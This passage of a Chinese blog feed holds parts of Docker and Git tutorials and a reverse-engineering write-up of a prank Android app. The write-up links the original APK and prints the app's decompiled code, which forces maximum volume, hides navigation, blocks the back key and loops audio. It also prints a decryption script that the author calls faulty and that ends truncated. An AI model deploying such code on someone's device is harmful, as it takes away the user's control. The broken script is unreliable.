class="hljs-built_in">save</span> geniotic/tor_zeronet_nodes:offline mysql:latest &gt; <span class="hljs-built_in">image</span>.tar<br>docker <span class="hljs-built_in">save</span> geniotic/tor_zeronet_nodes:offline mysql:latest - <span class="hljs-built_in">image</span>.tar<br></code></pre></td></tr></table></figure><p>恢复离线镜像</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">docker <span class="hljs-built_in">load</span> &lt; <span class="hljs-built_in">image</span>.tar<br>或<br>docker <span class="hljs-built_in">load</span> -i <span class="hljs-built_in">image</span>.tar<br></code></pre></td></tr></table></figure><h2 id="Docker其他技巧"><a href="#Docker其他技巧" class="headerlink" title="Docker其他技巧"></a>Docker其他技巧</h2><h3 id="crontab定时任务"><a href="#crontab定时任务" class="headerlink" title="crontab定时任务"></a>crontab定时任务</h3><p>Docker中可以添加crontab以启动定时任务，可以使用cronfile进行配置，示例如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">HOME=/app<br>* * * * * <span class="hljs-regexp">/bin/</span>echo <span class="hljs-string">&quot;0&quot;</span> &gt; <span class="hljs-regexp">/app/</span>done<br><span class="hljs-number">0</span> <span class="hljs-number">1</span> * * * <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>python3 <span class="hljs-regexp">/app/</span>detection.py -t ALL <br><span class="hljs-number">0</span> * * * * <span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>python3 <span class="hljs-regexp">/app/</span>detection.py -t Zeronet<br></code></pre></td></tr></table></figure><blockquote><p>  HOME变量指定了在执行命令或者脚本时使用的主目录</p></blockquote><p>当然需要首先安装并启动cron服务。</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-comment"># 安装cron dos2unix</span><br>apt-<span class="hljs-built_in">get</span> install -y <span class="hljs-comment">--no-install-recommends cron dos2unix</span><br><span class="hljs-comment"># 将windows下回车替换成linux回车</span><br>dos2unix /app/cronfile<br><span class="hljs-comment"># 读取cronfile文件</span><br>crontab cronfile<br><span class="hljs-comment"># 后台运行</span><br>service cron <span class="hljs-built_in">start</span><br></code></pre></td></tr></table></figure><p><strong>值得注意的是，</strong>crontab缺省用户profile文件中的环境变量参数, 导致手工执行脚本成功,但是到crontab中无法执行。可以使用以下命令导入环境变量。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> &gt;&gt; /etc/default/locale<br></code></pre></td></tr></table></figure><h3 id="mysql初始化数据库"><a href="#mysql初始化数据库" class="headerlink" title="mysql初始化数据库"></a>mysql初始化数据库</h3><p><code>docker</code>版的<code>mysql</code>支持一键导出指定数据库的内容，且能够在创建新的数据库是自动导入，这极大地方便了数据库迁移操作。</p><p><strong><code>mysql</code>导出数据</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> exec node_mysql_1 sh -c <span class="hljs-string">&#x27;exec mysqldump nodes -uroot -p&quot;<span class="hljs-variable">$MYSQL_ROOT_PASSWORD</span>&quot;&#x27;</span> &gt; da.sql<br></code></pre></td></tr></table></figure><p><strong><code>mysql</code>导入数据</strong></p><p><code>mysql</code>的<code>docker</code>中已经设定了<code>ENTRYPOINT</code>，里面会调用<code>/entrypoint.sh</code>这个脚本，我们把mysql:5.5这个镜像pull到本地，再用<code>docker run</code>启动起来，看看里面的<code>entrypoint.sh</code>这个脚本的内容，有一段内容就是从固定目录下遍历所有的<code>.sh</code>和.<code>sql</code>后缀的文件，然后执行。因此我们只需要将<code>mysql</code>导出的<code>sql</code>文件映射到<code>/docker-entrypoint-initdb.d/</code>目录下即可。</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">version</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&#x27;3&#x27;</span><br><span class="hljs-attribute">services</span><span class="hljs-punctuation">:</span><br>  <span class="hljs-attribute">web</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">geniotic/tor_zeronet_nodes:offline</span><br>    <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br>    <span class="hljs-attribute">ports</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">9999:9999</span><br>    <span class="hljs-attribute">x-environment</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-comment"># 全局共享变量,mysql数据库默认密码，离线版本请勿修改数据库密码</span><br>      <span class="hljs-attribute">&amp;shareEnvironment</span><br><span class="hljs-attribute">      MYSQL_ROOT_PASSWORD</span><span class="hljs-punctuation">:</span> <span class="hljs-string">thereisnopassword</span><br>    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">&lt;&lt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">*shareEnvironment</span><br>      <span class="hljs-comment">#HTTP_PROXY: socks5://172.17.0.1:10808</span><br>      <span class="hljs-comment">#HTTPS_PROXY: socks5://172.17.0.1:10808</span><br>    <span class="hljs-attribute">depends_on</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">mysql</span><br>    <span class="hljs-attribute">links</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">mysql</span><br><br>  <span class="hljs-attribute">mysql</span><span class="hljs-punctuation">:</span><br>    <span class="hljs-attribute">image</span><span class="hljs-punctuation">:</span> <span class="hljs-string">mysql</span><br>    <span class="hljs-attribute">volumes</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-comment">#- mysql-data:/var/lib/mysql</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">./init/:/docker-entrypoint-initdb.d/</span><br>    <span class="hljs-attribute">restart</span><span class="hljs-punctuation">:</span> <span class="hljs-string">always</span><br><br>    <span class="hljs-attribute">environment</span><span class="hljs-punctuation">:</span><br>      <span class="hljs-attribute">MYSQL_DATABASE</span><span class="hljs-punctuation">:</span> <span class="hljs-string">nodes</span><br>      <span class="hljs-attribute">&lt;&lt;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">*shareEnvironment</span><br><span class="hljs-comment"># volumes:</span><br><span class="hljs-comment">#   mysql-data:</span><br></code></pre></td></tr></table></figure><h3 id="docker容器后台挂起运行"><a href="#docker容器后台挂起运行" class="headerlink" title="docker容器后台挂起运行"></a>docker容器后台挂起运行</h3><p>某些时候我们需要容器后台挂起运行，因此需要一些特殊命令，例如：</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">sleep</span> infinite<br><span class="hljs-meta"># 这是linux命令，表示永久睡眠，可以在dockerfile中的CMD执行，也可以在bash脚本中执行。</span><br></code></pre></td></tr></table></figure><p><strong>参考链接</strong></p><blockquote><p><a href="https://stackoverflow.com/questions/31870222/how-can-i-keep-a-container-running-on-kubernetes">https://stackoverflow.com/questions/31870222/how-can-i-keep-a-container-running-on-kubernetes</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>教程文档</category>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>教程</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>送给最好的ta逆向分析</title>
    <link href="/2022/12/14/misc/%E9%80%81%E7%BB%99%E6%9C%80%E5%A5%BD%E7%9A%84ta%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <url>/2022/12/14/misc/%E9%80%81%E7%BB%99%E6%9C%80%E5%A5%BD%E7%9A%84ta%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="送给最好的ta逆向分析"><a href="#送给最好的ta逆向分析" class="headerlink" title="送给最好的ta逆向分析"></a>送给最好的ta逆向分析</h2><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs dts">文件名：送给最好的ta.apk<br><span class="hljs-symbol">CRC32:</span> <span class="hljs-number">31</span>C62FAD<br><span class="hljs-symbol">MD5:</span> <span class="hljs-number">9819F</span>3FA458129D7CA092C32839B7F38<br><span class="hljs-symbol">SHA1:</span> A948ACADD5647FF44E120CC6789BE7D8CCA59660<br><span class="hljs-symbol">SHA256:</span> <span class="hljs-number">205160694</span>C6D86C3056AAA2FB196B485CFA2A8A2F9F08BA966BE03B9EBFD936A<br>下载地址：https:<span class="hljs-comment">//www.123pan.com/s/07yA-W504 提取码:G5ob</span><br>注：这是原版app，请不要在公共场合运行，后果自负，概不负责。<br></code></pre></td></tr></table></figure><h3 id="分析安卓源码"><a href="#分析安卓源码" class="headerlink" title="分析安卓源码"></a>分析安卓源码</h3><p>使用Android Killer对软件进行逆向分析，我们可以看待内置了一个0.mp3这个应该就是循环播放的音频。</p><p><img src="https://img-blog.csdnimg.cn/f4c09e903fba43d09f107ccbcc385468.png" alt="image-20221211145047788"></p><p>打开<code>init.lua</code>和<code>main.lua</code>发现是乱码，可能存在加密。</p><p>我们来手动反编译一下apk，获得原始文件，使用dex2jar工具生成jar文件。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>apktool.<span class="hljs-keyword">jar </span>d App.apk<br></code></pre></td></tr></table></figure><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">d2j-dex2jar.<span class="hljs-keyword">bat </span>classes.dex<br></code></pre></td></tr></table></figure><p>使用jd-gui可以查看其java源码。</p><p><img src="https://img-blog.csdnimg.cn/8f1a7b168c5b4196a33f8eebed3428a1.png" alt="image-20221213140220539"></p><p>可以看到存在<code>com.androlua</code>、<code>com.nirenr</code>、<code>comluajava</code>等包名，搜索相关内容可以发现大部分app代码均来自于**<a href="https://github.com/nirenr/AndroLua_pro">AndroLua_pro</a>**，可以猜测应该是使用了AndroLua_pro框架，AndroLua_pro是一个基于LuaJava开发的安卓平台轻量型的脚本编程语言工具。</p><p>通过搜索项目文件，最终在<code>com.luajava.LuaState</code>发现了引用动态链接库的代码，最终动态链接库会在<code>lib/arm/</code>目录中搜索。</p><p><img src="https://img-blog.csdnimg.cn/10a2b91655a745ebacbd6fa75cdcb4ff.png" alt="image-20221213214006292"></p><h3 id="反编译动态链接库"><a href="#反编译动态链接库" class="headerlink" title="反编译动态链接库"></a>反编译动态链接库</h3><p>AndroLua_Pro所使用的Lua工具<code>LuaJava</code>会加载依赖库<code>libluajava.so</code>，我们使用IDA逆向分析该文件。LuaJava通常会使用<code>luaL_loadbuffer</code>或者<code>luaL_loadbufferx</code>函数对Lua进行加载，此处也是加入Lua解密代码常见位置。</p><p><img src="https://img-blog.csdnimg.cn/cf9350d3492b46a4ad934c96d24bb654.png" alt="image-20221213145938465"></p><p>但是IDA反编译似乎出现了一些问题，在汇编语言中存在变量异或操作，但是IDA反编译后，异或操作却消失了。</p><p><img src="https://img-blog.csdnimg.cn/74375f6d04624bd2a6457325fd307f23.png" alt="image-20221213150038234"></p><p>这里我们使用了Ghidra重新进行反汇编可以看到相应加密代码。</p><p><img src="https://img-blog.csdnimg.cn/7d635b70a20640e384fe0ca391fed161.png" alt="image-20221213221053495"></p><p>通过上面的分析很容易就可以看出这是一个异或加密，简单写一个解密脚本，找了好多解密代码，似乎都有问题不知道啥情况，先这样吧懒得搞了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding:utf8 -*-</span><br>__author__=<span class="hljs-string">&#x27;pcat@chamd5.org&#x27;</span><br>__blog__=<span class="hljs-string">&#x27;http://pcat.cc&#x27;</span><br><br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">filename</span>):<br>    s=<span class="hljs-built_in">open</span>(filename,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    outfile=<span class="hljs-string">&#x27;decode_&#x27;</span>+ filename<br>    <span class="hljs-keyword">if</span> s[<span class="hljs-number">0</span>]==<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x1b</span>) <span class="hljs-keyword">and</span> s[<span class="hljs-number">1</span>]!=<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x4c</span>):<br>        rst=<span class="hljs-built_in">chr</span>(<span class="hljs-number">0x1b</span>)<br>        size=<span class="hljs-built_in">len</span>(s)<br>        v10=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,size):<br>            v10+=size<br>            v=(c_ulonglong(-<span class="hljs-number">2139062143</span>*v10).value&gt;&gt;<span class="hljs-number">32</span>)+v10<br>            v1=c_uint(v).value&gt;&gt;<span class="hljs-number">7</span><br>            v2=c_int(v).value&lt;<span class="hljs-number">0</span><br>            rst+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(s[i])^(v10+v1+v2)&amp;<span class="hljs-number">0xff</span>)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(outfile,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(rst)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv)==<span class="hljs-number">2</span>:<br>        filename=sys.argv[<span class="hljs-number">1</span>]<br>    <span class="hljs-keyword">else</span>:<br>        filename=<span class="hljs-string">&#x27;main.lua&#x27;</span><br>    decrypt(filename)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    foo(<br></code></pre></td></tr></table></figure><h3 id="安卓动态调试"><a href="#安卓动态调试" class="headerlink" title="安卓动态调试"></a>安卓动态调试</h3><p>这里我们也可以通过安卓程序动态调试直接从内存中获得解密的lua脚本。</p><p><strong>注：</strong>太复杂了，放弃</p><p><strong>重新打包apk</strong></p><p>首先我们先将0.mp3替换成其他文件，防止社死。。。，之后使用<code>apktool</code>重新打包。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>apktool.<span class="hljs-keyword">jar </span><span class="hljs-keyword">b </span>APK<br></code></pre></td></tr></table></figure><p>命令执行成功后，会在<code>APK</code>目录下会生成<code>build</code>和<code>dist</code>目录：</p><ul><li>build目录下存放的是打包后的dex文件和资源文件（和apk解压后一样一样的）</li><li>dist目录下存放的是重新打包后的apk文件</li></ul><p><strong>使用autosign重新签名</strong></p><p>签名apk，重新发布，接下来就要用到签名工具<code>signapk.jar</code>了，如果不经过签名是不能正确运行的。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">signapk<span class="hljs-selector-class">.bat</span> APK<span class="hljs-selector-class">.apk</span> APK_sign.apk<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2c82f5f3ad65468d9963db7a0aefa6bc.png" alt="image-20221214111106732"></p><h3 id="反编译lua脚本"><a href="#反编译lua脚本" class="headerlink" title="反编译lua脚本"></a>反编译lua脚本</h3><p>接下来我们反编译lua字节码</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>unluac.<span class="hljs-keyword">jar </span>decode_init.lua &gt;init-decomp.lua<br><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>unluac.<span class="hljs-keyword">jar </span>decode_main.lua &gt;main-decomp.lua<br></code></pre></td></tr></table></figure><p>查看<code>init.lua</code>，代码的用途是声明应用基本信息。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs llvm">local L<span class="hljs-number">0</span>_<span class="hljs-number">0</span><br>appname <span class="hljs-operator">=</span> <span class="hljs-string">&quot;<span class="hljs-char escape_">\23</span>3<span class="hljs-char escape_">\12</span>8<span class="hljs-char escape_">\12</span>9<span class="hljs-char escape_">\23</span>1<span class="hljs-char escape_">\18</span>7<span class="hljs-char escape_">\15</span>3<span class="hljs-char escape_">\23</span>0<span class="hljs-char escape_">\15</span>6<span class="hljs-char escape_">\12</span>8<span class="hljs-char escape_">\22</span>9<span class="hljs-char escape_">\16</span>5<span class="hljs-char escape_">\18</span>9<span class="hljs-char escape_">\23</span>1<span class="hljs-char escape_">\15</span>4<span class="hljs-char escape_">\13</span>2TA&quot;</span><br>appver <span class="hljs-operator">=</span> <span class="hljs-string">&quot;1.0&quot;</span><br>appcode <span class="hljs-operator">=</span> <span class="hljs-string">&quot;10&quot;</span><br>appsdk <span class="hljs-operator">=</span> <span class="hljs-string">&quot;15&quot;</span><br>path_pattern <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>packagename <span class="hljs-operator">=</span> <span class="hljs-string">&quot;com.sgzh.dt&quot;</span><br>theme <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Theme_DeviceDefault_Dialog_NoActionBar_MinWidth&quot;</span><br>app_key <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>app_channel <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>developer <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>description <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span><br>debugmode <span class="hljs-operator">=</span> <span class="hljs-keyword">false</span><br>L<span class="hljs-number">0</span>_<span class="hljs-number">0</span> <span class="hljs-operator">=</span> &#123;<br>  <span class="hljs-string">&quot;INTERNET&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-string">&quot;WRITE_EXTERNAL_STORAGE&quot;</span><br>&#125;<br>user_permission <span class="hljs-operator">=</span> L<span class="hljs-number">0</span>_<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>执行具体功能的代码<code>main-decomp.lua</code></p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs erlang"><span class="hljs-function"><span class="hljs-title">require</span><span class="hljs-params">(<span class="hljs-string">&quot;import&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">import</span><span class="hljs-params">(<span class="hljs-string">&quot;android.app.*&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">import</span><span class="hljs-params">(<span class="hljs-string">&quot;android.os.*&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">import</span><span class="hljs-params">(<span class="hljs-string">&quot;android.widget.*&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">import</span><span class="hljs-params">(<span class="hljs-string">&quot;android.view.*&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">import</span><span class="hljs-params">(<span class="hljs-string">&quot;android.view.View&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">import</span><span class="hljs-params">(<span class="hljs-string">&quot;android.content.Context&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">import</span><span class="hljs-params">(<span class="hljs-string">&quot;android.media.MediaPlayer&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">import</span><span class="hljs-params">(<span class="hljs-string">&quot;android.media.AudioManager&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">import</span><span class="hljs-params">(<span class="hljs-string">&quot;com.androlua.Ticker&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">activity</span>.<span class="hljs-title">getSystemService</span><span class="hljs-params">(Context.AUDIO_SERVICE)</span>.<span class="hljs-title">setStreamVolume</span><span class="hljs-params">(AudioManager.STREAM_MUSIC, <span class="hljs-number">15</span>, AudioManager.FLAG_SHOW_UI)</span></span><br><span class="hljs-function"><span class="hljs-title">activity</span>.<span class="hljs-title">getDecorView</span><span class="hljs-params">()</span>.<span class="hljs-title">setSystemUiVisibility</span><span class="hljs-params">(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE)</span></span><br><span class="hljs-function"><span class="hljs-title">m</span> = M<span class="hljs-title">ediaPlayer</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">m</span>.<span class="hljs-title">reset</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">m</span>.<span class="hljs-title">setDataSource</span><span class="hljs-params">(activity.getLuaDir() .. <span class="hljs-string">&quot;/0.mp3&quot;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">m</span>.<span class="hljs-title">prepare</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">m</span>.<span class="hljs-title">start</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">m</span>.<span class="hljs-title">setLooping</span><span class="hljs-params">(true)</span></span><br><span class="hljs-function"><span class="hljs-title">ti</span> = T<span class="hljs-title">icker</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">ti</span>.P<span class="hljs-title">eriod</span> = 10</span><br><span class="hljs-function"><span class="hljs-title">function</span> <span class="hljs-title">ti</span>.<span class="hljs-title">onTick</span><span class="hljs-params">()</span></span><br><span class="hljs-function">  <span class="hljs-title">activity</span>.<span class="hljs-title">getSystemService</span><span class="hljs-params">(Context.AUDIO_SERVICE)</span>.<span class="hljs-title">setStreamVolume</span><span class="hljs-params">(AudioManager.STREAM_MUSIC, <span class="hljs-number">15</span>, AudioManager.FLAG_SHOW_UI)</span></span><br><span class="hljs-function">  <span class="hljs-title">activity</span>.<span class="hljs-title">getDecorView</span><span class="hljs-params">()</span>.<span class="hljs-title">setSystemUiVisibility</span><span class="hljs-params">(View.SYSTEM_UI_FLAG_HIDE_NAVIGATION | View.SYSTEM_UI_FLAG_IMMERSIVE)</span></span><br><span class="hljs-function"><span class="hljs-title">end</span></span><br><span class="hljs-function"><span class="hljs-title">ti</span>.<span class="hljs-title">start</span><span class="hljs-params">()</span></span><br><span class="hljs-function"><span class="hljs-title">function</span> <span class="hljs-title">onKeyDown</span><span class="hljs-params">(A0_0, A1_1)</span></span><br><span class="hljs-function">  <span class="hljs-title">if</span> <span class="hljs-title">string</span>.<span class="hljs-title">find</span><span class="hljs-params">(tostring(A1_1), <span class="hljs-string">&quot;KEYCODE_BACK&quot;</span>)</span> ~= <span class="hljs-title">nil</span> <span class="hljs-title">then</span></span><br><span class="hljs-function">    <span class="hljs-title">activity</span>.<span class="hljs-title">getSystemService</span><span class="hljs-params">(Context.AUDIO_SERVICE)</span>.<span class="hljs-title">setStreamVolume</span><span class="hljs-params">(AudioManager.STREAM_MUSIC, <span class="hljs-number">15</span>, AudioManager.FLAG_SHOW_UI)</span></span><br><span class="hljs-function">  <span class="hljs-title">end</span></span><br><span class="hljs-function">  <span class="hljs-title">return</span> <span class="hljs-title">true</span></span><br><span class="hljs-function"><span class="hljs-title">end</span></span><br></code></pre></td></tr></table></figure><p>具体操作有：</p><ul><li>将系统音量调制最大</li><li>隐藏系统状态和导航栏，进入全屏模式</li><li>每10tick重复上述步骤</li><li>屏蔽系统返回键</li><li>循环播放音频文件0.mp3</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://juejin.cn/post/6844903479811506184">深入理解 System.loadLibrary</a></p><p><a href="https://www.secrss.com/articles/8829">NSA开源逆向工具Ghidra入门使用教程</a></p><p><a href="https://blog.csdn.net/gooding300/article/details/101540988">[Android] 「送给最好的 TA」App逆向与Lua脚本解密实例</a></p><p><a href="https://blog.csdn.net/hexingen/article/details/76731721">Android应用程序签名系统的签名(SignApk.jar)</a></p>]]></content>
    
    
    <categories>
      
      <category>逆向</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向</tag>
      
      <tag>安卓</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Git基础教程</title>
    <link href="/2022/12/09/Guide/Git%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
    <url>/2022/12/09/Guide/Git%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="git基础命令介绍"><a href="#git基础命令介绍" class="headerlink" title="git基础命令介绍"></a>git基础命令介绍</h2><h3 id="创建一个版本库"><a href="#创建一个版本库" class="headerlink" title="创建一个版本库"></a>创建一个版本库</h3><p>​版本库也就是仓库，英文名<strong>repository</strong>，我们经常使用网页端git直接new一个版本库，这里我们介绍一下如何使用命令创建一个仓库。</p><ul><li>首先创建一个文件夹作为仓库文件夹，当然这里也可以使用存有内容的文件夹并非必须是一个空的文件夹，只做样例展示。</li><li>使用<code>git init</code>初始化仓库</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> learngit<br><span class="hljs-built_in">cd</span> learngit<br>git init<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/b425263cc07141b6a10e9e5bbc356137.png" alt="image-20221209203219599"></p><p>​如图，此时一个空的版本库就做好了，这个时候我们也可以看到文件夹内自动创了<code>.git</code>目录。</p><p>ok，我们现在来上传一个文件试试，<code>readme.txt</code>存有新添加内容。</p><p><img src="https://img-blog.csdnimg.cn/direct/ba2a3d8aeaaa4c97a6249439e9052e1f.png" alt="image-20221209204247400"></p><ul><li>首先将文件存储到git暂存区，就是告诉git我要把这个文件添加到仓库。<code>git add</code>可以添加多个文件或目录，<code>git add .</code>会将本目录下所有文件存储至暂存区。此时git已经记录了一条操作记录即创建<code>readme.txt</code>文件，我们可以使用<code>git status</code>查看文件操作记录。</li></ul><figure class="highlight routeros"><table><tr><td 